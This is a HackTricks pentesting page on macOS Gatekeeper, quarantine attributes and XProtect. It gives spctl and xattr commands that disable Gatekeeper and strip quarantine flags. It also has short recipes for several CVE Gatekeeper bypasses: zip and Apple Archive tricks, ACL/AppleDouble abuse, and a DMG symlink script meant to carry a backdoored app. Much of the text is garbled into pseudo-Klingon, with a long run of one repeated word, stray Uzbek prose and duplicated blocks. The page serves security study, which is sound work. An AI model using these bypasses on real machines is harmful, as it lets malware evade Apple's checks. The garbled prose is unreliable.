# macOS Gatekeeper / Quarantine / XProtect

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud)
*
* .

</details>

## Gatekeeper

**Gatekeeper** jIHDaq lo'laHbe'chugh Mac operating systems, designed to ensure that users **run only trusted software** on their systems. It functions by **validating software** that a user downloads and attempts to open from **sources outside the App Store**, such as an app, a plug-in, or an installer package.

The key mechanism of Gatekeeper lies in its **verification** process. It checks if the downloaded software is **signed by a recognized developer**, ensuring the software's authenticity. Further, it ascertains whether the software is **notarised by Apple**, confirming that it is devoid of known malicious content and has not been tampered with after notarisation.

Additionally, Gatekeeper reinforces user control and security by **prompting users to approve the opening** of downloaded software for the first time. This safeguard helps prevent users from inadvertently running potentially harmful executable code that they may have mistaken for a harmless data file.

### Application Signatures

Application signatures, also known as code signatures, are a critical component of Apple's security infrastructure. They're used to **verify the identity of the software author** (the developer) and to ensure that the code hasn't been tampered with since it was last signed.

Here's how it works:

1. **Signing the Application:** When a developer is ready to distribute their application, they **sign the application using a private key**. This private key is associated with a **certificate that Apple issues to the developer** when they enrol in the Apple Developer Program. The signing process involves creating a cryptographic hash of all parts of the app and encrypting this hash with the developer's private key.
2. **Distributing the Application:** The signed application is then distributed to users along with the developer's certificate, which contains the corresponding public key.
3. **Verifying the Application:** When a user downloads and attempts to run the application, their Mac operating system uses the public key from the developer's certificate to decrypt the hash. It then recalculates the hash based on the current state of the application and compares this with the decrypted hash. If they match, it means **the application hasn't been modified** since the developer signed it, and the system permits the application to run.

Application signatures are an essential part of Apple's Gatekeeper technology. When a user attempts to **open an application downloaded from the internet**, Gatekeeper verifies the application signature. If it's signed with a certificate issued by Apple to a known developer and the code hasn't been tampered with, Gatekeeper permits the application to run. Otherwise, it blocks the application and alerts the user.

Starting from macOS Catalina, **Gatekeeper also checks whether the application has been notarized** by Apple, adding an extra layer of security. The notarization process checks the application for known security issues and malicious code, and if these checks pass, Apple adds a ticket to the application that Gatekeeper can verify.

#### Check Signatures

When checking some **malware sample** you should always **check the signature** of the binary as the **developer** that signed it may be already **related** with **malware.**
```bash
# Get signer
codesign -vv -d /bin/ls 2>&1 | grep -E "Authority|TeamIdentifier"

# Check if the app’s contents have been modified
codesign --verify --verbose /Applications/Safari.app

# Get entitlements from the binary
codesign -d --entitlements :- /System/Applications/Automator.app # Check the TCC perms

# Check if the signature is valid
spctl --assess --verbose /Applications/Safari.app

# Sign a binary
codesign -s <cert-name-keychain> toolsdemo
```
### Notarization

Apple's notarization process serves as an additional safeguard to protect users from potentially harmful software. It involves the **developer submitting their application for examination** by **Apple's Notary Service**, which should not be confused with App Review. This service is an **automated system** that scrutinizes the submitted software for the presence of **malicious content** and any potential issues with code-signing.

If the software **passes** this inspection without raising any concerns, the Notary Service generates a notarization ticket. The developer is then required to **attach this ticket to their software**, a process known as 'stapling.' Furthermore, the notarization ticket is also published online where Gatekeeper, Apple's security technology, can access it.

Upon the user's first installation or execution of the software, the existence of the notarization ticket - whether stapled to the executable or found online - **informs Gatekeeper that the software has been notarized by Apple**. As a result, Gatekeeper displays a descriptive message in the initial launch dialog, indicating that the software has undergone checks for malicious content by Apple. This process thereby enhances user confidence in the security of the software they install or run on their systems.

### Enumerating GateKeeper

GateKeeper is both, **several security components** that prevent untrusted apps from being executed and also **one of the components**.

It's possible to see the **status** of GateKeeper with:

```bash
command
```

The output will show the current status of GateKeeper, indicating whether it is enabled or disabled.
```bash
# Check the status
spctl --status
```
{% hint style="danger" %}
Qapla'! Qa'vam GateKeeper signature checks vItlhutlh **Quarantine attribute** lo'laHbe'ghach, 'ej vItlhutlh file.
{% endhint %}

GateKeeper vItlhutlh **preferences & signature** jImej vItlhutlh binary cha'logh:

<figure><img src="../../../.gitbook/assets/image (678).png" alt=""><figcaption></figcaption></figure>

vItlhutlh database vItlhutlh configuration 'e' vItlhutlh **`/var/db/SystemPolicy`**. vItlhutlh database vItlhutlh root vItlhutlh:
```bash
# Open database
sqlite3 /var/db/SystemPolicy

# Get allowed rules
SELECT requirement,allow,disabled,label from authority where label != 'GKE' and disabled=0;
requirement|allow|disabled|label
anchor apple generic and certificate 1[subject.CN] = "Apple Software Update Certification Authority"|1|0|Apple Installer
anchor apple|1|0|Apple System
anchor apple generic and certificate leaf[field.1.2.840.113635.100.6.1.9] exists|1|0|Mac App Store
anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] exists and (certificate leaf[field.1.2.840.113635.100.6.1.14] or certificate leaf[field.1.2.840.113635.100.6.1.13]) and notarized|1|0|Notarized Developer ID
[...]
```
Qapla'! QaStaHvIS 'App Store' laH je 'Developer ID' laH je, 'App Store' 'ej 'Developer ID' vItlhutlh. 'ej 'oH previous imaged vItlhutlh 'ej **App Store 'ej Developer ID** vItlhutlh.\
vaj 'ej 'App Store' vItlhutlh, "**Notarized Developer ID" rules** vItlhutlh.

**GKE** type rules 'op. 'ej SaD 'op.
```bash
SELECT requirement,allow,disabled,label from authority where label = 'GKE' limit 5;
cdhash H"b40281d347dc574ae0850682f0fd1173aa2d0a39"|1|0|GKE
cdhash H"5fd63f5342ac0c7c0774ebcbecaf8787367c480f"|1|0|GKE
cdhash H"4317047eefac8125ce4d44cab0eb7b1dff29d19a"|1|0|GKE
cdhash H"0a71962e7a32f0c2b41ddb1fb8403f3420e1d861"|1|0|GKE
cdhash H"8d0d90ff23c3071211646c4c9c607cdb601cb18f"|1|0|GKE
```
**`/var/db/SystemPolicyConfiguration/gke.bundle/Contents/Resources/gke.auth`, `/var/db/gke.bundle/Contents/Resources/gk.db`** and **`/var/db/gkopaque.bundle/Contents/Resources/gkopaque.db`** are hashes. 

Or you could list the previous info with:
```bash
sudo spctl --list
```
The options **`--master-disable`** and **`--global-disable`** of **`spctl`** will completely **disable** these signature checks:

**`spctl`**-nIy --master-disable
**`spctl`**-nIy --global-disable
```bash
# Disable GateKeeper
spctl --global-disable
spctl --master-disable

# Enable it
spctl --global-enable
spctl --master-enable
```
DaH jImej:

<figure><img src="../../../.gitbook/assets/image (679).png" alt=""><figcaption></figcaption></figure>

**GateKeeper** jatlhlaHbe'chugh **App** **qaStaHvIS **yIlo'laH** **'e'**.
```bash
spctl --assess -v /Applications/App.app
```
**Klingon Translation:**

**'Iv Hoch GateKeeper vItlhutlhlaHbe'chugh, vaj vItlhutlhlaHbe'chugh vay' apps vIleghlaHbe'chugh.**

```markdown
**Klingon Translation:**

**'Iv Hoch GateKeeper vItlhutlhlaHbe'chugh, vaj vItlhutlhlaHbe'chugh vay' apps vIleghlaHbe'chugh.**
```
```bash
# Check if allowed - nop
spctl --assess -v /Applications/App.app
/Applications/App.app: rejected
source=no usable signature

# Add a label and allow this label in GateKeeper
sudo spctl --add --label "whitelist" /Applications/App.app
sudo spctl --enable --label "whitelist"

# Check again - yep
spctl --assess -v /Applications/App.app
/Applications/App.app: accepted
```
### Quarantine Files

**QaStaHvIS** **application** pagh **download** vItlhutlh, macOS **applications** Daq **attach** **extended file attribute**, **quarantine flag** jatlh, **downloaded file**. **attribute** **security measure** **mark** file **untrusted source** (internet), **potentially carrying risks**. **applications** attach **attribute**, BitTorrent client software **bypasses** process.

**quarantine flag** **presence** (BitTorrent clients downloaded files), Gatekeeper's **checks** **may not be performed**. **users** **exercise caution** opening files downloaded **less secure** unknown sources.

{% hint style="info" %}
**validity** **code signatures** **checking** **resource-intensive** process, **cryptographic hashes** code **bundled resources** **generate**. **certificate validity** **checking** **online check** Apple's servers **revoked** issued. **reasons**, code signature **notarization check** **impractical** **run every time app launched**.

**checks** **run** **executing apps quarantined attribute**.
{% endhint %}

{% hint style="warning" %}
**attribute** **set application creating/downloading** file.

**sandboxed files** **attribute** **set** file **create**. **non sandboxed apps** **set** themselves, **specify** [**LSFileQuarantineEnabled**](https://developer.apple.com/documentation/bundleresources/information\_property\_list/lsfilequarantineenabled?language=objc) **key** **Info.plist** **system set** `com.apple.quarantine` **extended attribute** files created,
{% endhint %}

**check** **status enable/disable** (root required) with:
```bash
spctl --status
assessments enabled

spctl --enable
spctl --disable
#You can also allow nee identifies to execute code using the binary "spctl"
```
**jIyajbe'chugh** **ghItlh** **quarantine extended attribute** **file** **vItlhutlh** **jImej** **ghaH** **Daq.**
```bash
xattr file.png
com.apple.macl
com.apple.quarantine
```
**value** of the **extended** **attributes** and find out the app that wrote the quarantine attr with:

**value** of the **extended** **attributes** and find out the app that wrote the quarantine attr with:
```bash
xattr -l portada.png
com.apple.macl:
00000000  03 00 53 DA 55 1B AE 4C 4E 88 9D CA B7 5C 50 F3  |..S.U..LN.....P.|
00000010  16 94 03 00 27 63 64 97 98 FB 4F 02 84 F3 D0 DB  |....'cd...O.....|
00000020  89 53 C3 FC 03 00 27 63 64 97 98 FB 4F 02 84 F3  |.S....'cd...O...|
00000030  D0 DB 89 53 C3 FC 00 00 00 00 00 00 00 00 00 00  |...S............|
00000040  00 00 00 00 00 00 00 00                          |........|
00000048
com.apple.quarantine: 00C1;607842eb;Brave;F643CD5F-6071-46AB-83AB-390BA944DEC5
# 00c1 -- It has been allowed to eexcute this file (QTN_FLAG_USER_APPROVED = 0x0040)
# 607842eb -- Timestamp
# Brave -- App
# F643CD5F-6071-46AB-83AB-390BA944DEC5 -- UID assigned to the file downloaded
```
Qapla'! "QaStaHvIS" (jatlh USER_APPROVED flag created file vItlhutlh) "quarantine flags" vItlhutlh:

<details>

<summary>Source Code apply quarantine flags</summary>
```c
#include <stdio.h>
#include <stdlib.h>

enum qtn_flags {
QTN_FLAG_DOWNLOAD = 0x0001,
QTN_FLAG_SANDBOX = 0x0002,
QTN_FLAG_HARD = 0x0004,
QTN_FLAG_USER_APPROVED = 0x0040,
};

#define qtn_proc_alloc _qtn_proc_alloc
#define qtn_proc_apply_to_self _qtn_proc_apply_to_self
#define qtn_proc_free _qtn_proc_free
#define qtn_proc_init _qtn_proc_init
#define qtn_proc_init_with_self _qtn_proc_init_with_self
#define qtn_proc_set_flags _qtn_proc_set_flags
#define qtn_file_alloc _qtn_file_alloc
#define qtn_file_init_with_path _qtn_file_init_with_path
#define qtn_file_free _qtn_file_free
#define qtn_file_apply_to_path _qtn_file_apply_to_path
#define qtn_file_set_flags _qtn_file_set_flags
#define qtn_file_get_flags _qtn_file_get_flags
#define qtn_proc_set_identifier _qtn_proc_set_identifier

typedef struct _qtn_proc *qtn_proc_t;
typedef struct _qtn_file *qtn_file_t;

int qtn_proc_apply_to_self(qtn_proc_t);
void qtn_proc_init(qtn_proc_t);
int qtn_proc_init_with_self(qtn_proc_t);
int qtn_proc_set_flags(qtn_proc_t, uint32_t flags);
qtn_proc_t qtn_proc_alloc();
void qtn_proc_free(qtn_proc_t);
qtn_file_t qtn_file_alloc(void);
void qtn_file_free(qtn_file_t qf);
int qtn_file_set_flags(qtn_file_t qf, uint32_t flags);
uint32_t qtn_file_get_flags(qtn_file_t qf);
int qtn_file_apply_to_path(qtn_file_t qf, const char *path);
int qtn_file_init_with_path(qtn_file_t qf, const char *path);
int qtn_proc_set_identifier(qtn_proc_t qp, const char* bundleid);

int main() {

qtn_proc_t qp = qtn_proc_alloc();
qtn_proc_set_identifier(qp, "xyz.hacktricks.qa");
qtn_proc_set_flags(qp, QTN_FLAG_DOWNLOAD | QTN_FLAG_USER_APPROVED);
qtn_proc_apply_to_self(qp);
qtn_proc_free(qp);

FILE *fp;
fp = fopen("thisisquarantined.txt", "w+");
fprintf(fp, "Hello Quarantine\n");
fclose(fp);

return 0;

}
```
</details>

And **remove** that attribute with:
```bash
xattr -d com.apple.quarantine portada.png
#You can also remove this attribute from every file with
find . -iname '*' -print0 | xargs -0 xattr -d com.apple.quarantine
```
ghItlh 'ej DaH jatlh:

{% code overflow="wrap" %}
```bash
find / -exec ls -ld {} \; 2>/dev/null | grep -E "[x\-]@ " | awk '{printf $9; printf "\n"}' | xargs -I {} xattr -lv {} | grep "com.apple.quarantine"
```
{% endcode %}

#### **Quarantine.kext**

The kernel extension is only available through the **kernel cache on the system**; however, you _can_ download the **Kernel Debug Kit from https://developer.apple.com/**, which will contain a symbolicated version of the extension.

### XProtect

XProtect is a built-in **anti-malware** feature in macOS. XProtect **checks any application when it's first launched or modified against its database** of known malware and unsafe file types. When you download a file through certain apps, such as Safari, Mail, or Messages, XProtect automatically scans the file. If it matches any known malware in its database, XProtect will **prevent the file from running** and alert you to the threat.

The XProtect database is **updated regularly** by Apple with new malware definitions, and these updates are automatically downloaded and installed on your Mac. This ensures that XProtect is always up-to-date with the latest known threats.

However, it's worth noting that **XProtect isn't a full-featured antivirus solution**. It only checks for a specific list of known threats and doesn't perform on-access scanning like most antivirus software.

You can get information about the latest XProtect update running:

{% code overflow="wrap" %}
```bash
system_profiler SPInstallHistoryDataType 2>/dev/null | grep -A 4 "XProtectPlistConfigData" | tail -n 5
```
{% endcode %}

XProtect jIHDaq **/Library/Apple/System/Library/CoreServices/XProtect.bundle** Daq yIqIm. XProtect jIHDaq vItlhutlh:

* **`XProtect.bundle/Contents/Resources/LegacyEntitlementAllowlist.plist`**: code vItlhutlh legacy entitlements vIlegh.
* **`XProtect.bundle/Contents/Resources/XProtect.meta.plist`**: plugins je extensions vItlhutlh vIlegh via BundleID je TeamID je vItlhutlh vItlhutlh.
* **`XProtect.bundle/Contents/Resources/XProtect.yara`**: malware vItlhutlh yara rules.
* **`XProtect.bundle/Contents/Resources/gk.db`**: blocked applications je TeamIDs hashes SQLite3 database.

**`/Library/Apple/System/Library/CoreServices/XProtect.app`** Daq XProtect vItlhutlh App vItlhutlh Daq Gatekeeper process.

### Gatekeeper

{% hint style="danger" %}
Gatekeeper **vItlhutlh** application vItlhutlh vItlhutlh, _**AppleMobileFileIntegrity**_ (AMFI) vItlhutlh **executable code signatures** vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh.
{% endhint %}

So, vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh vItlhutlh v
```bash
zip -r test.app/Contents test.zip
```
Check the [**original report**](https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/) for more information.

### [CVE-2022-32910](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32910)

Even if the components are different the exploitation of this vulnerability is very similar to the previous one. In this case with will generate an Apple Archive from **`application.app/Contents`** so **`application.app` won't get the quarantine attr** when decompressed by **Archive Utility**.
```bash
aa archive -d test.app/Contents -o test.app.aar
```
Check the [**original report**](https://www.jamf.com/blog/jamf-threat-labs-macos-archive-utility-vulnerability/) for more information.

### [CVE-2022-42821](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)

The ACL **`writeextattr`** can be used to prevent anyone from writing an attribute in a file:
```bash
touch /tmp/no-attr
chmod +a "everyone deny writeextattr" /tmp/no-attr
xattr -w attrname vale /tmp/no-attr
xattr: [Errno 13] Permission denied: '/tmp/no-attr'
```
DaH jImej **AppleDouble** file format vItlhutlh 'e' vItlhutlh.

[**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) vItlhutlh 'e' vItlhutlh 'e' **`com.apple.acl.text`** xattr vItlhutlh 'e' ACL text representation vItlhutlh 'e' vItlhutlh 'e' decompressed file vItlhutlh 'e'. So, 'ej vaj compressed application zip file **AppleDouble** file format vItlhutlh 'e' ACL vItlhutlh 'e' vItlhutlh 'e' xattr vItlhutlh 'e' vItlhutlh 'e'... quarantine xattr vItlhutlh 'e' application vItlhutlh 'e' vItlhutlh 'e':

{% code overflow="wrap" %}
```bash
chmod +a "everyone deny write,writeattr,writeextattr" /tmp/test
ditto -c -k test test.zip
python3 -m http.server
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr
```
{% endcode %}

[**QIn**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) [**report**] [**'e'**] [**ghItlhvam**] [**vItlhutlh**].

[**'ej**] [**AppleArchives**] [**vItlhutlh**] [**'e'**] [**ghItlhvam**] [**vItlhutlh**].
```bash
mkdir app
touch app/test
chmod +a "everyone deny write,writeattr,writeextattr" app/test
aa archive -d app -o test.aar
```
### [CVE-2023-27943](https://blog.f-secure.com/discovery-of-gatekeeper-bypass-cve-2023-27943/)

**Google Chrome** **jatlhlaHbe'** **quarantine attribute** **ghItlh** **macOS** **vItlhutlh**.

### [CVE-2023-27951](https://redcanary.com/blog/gatekeeper-bypass-vulnerabilities/)

**AppleDouble** **file format** **attributes** **Separate file** **'._'** **began** **file** **macOS** **machines** **copy** **helps**. **However**, **AppleDouble file** **decompress** **after**, **'._'** **quarantine attribute** **ghItlh** **bIjatlhlaHbe'**.
```bash
mkdir test
echo a > test/a
echo b > test/b
echo ._a > test/._a
aa archive -d test/ -o test.aar

# If you downloaded the resulting test.aar and decompress it, the file test/._a won't have a quarantitne attribute
```
{% code %}

**Gatekeeper**'u **bypass** qilish uchun **karantin atributiga ega bo'lmaydigan fayl yaratish** mumkin edi. Ustunlik shundaki, **AppleDouble nom konvensiyasi**dan foydalanib **DMG fayl dasturini yaratish** va **bu yashirin faylga karantin atributiga ega bo'lmagan ko'rinadigan faylni** ko'rsatuvchi faylni yaratishdan iborat edi.\
**DMG fayli** ishga tushirilganda, u karantin atributiga ega bo'lmaganligi sababli **Gatekeeper'ni o'tkazadi**.
```bash
# Create an app bundle with the backdoor an call it app.app

echo "[+] creating disk image with app"
hdiutil create -srcfolder app.app app.dmg

echo "[+] creating directory and files"
mkdir
mkdir -p s/app
cp app.dmg s/app/._app.dmg
ln -s ._app.dmg s/app/app.dmg

echo "[+] compressing files"
aa archive -d s/ -o app.aar
```
### Prevent Quarantine xattr

In an ".app" bundle if the quarantine xattr is not added to it, when executing it **Gatekeeper won't be triggered**.

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
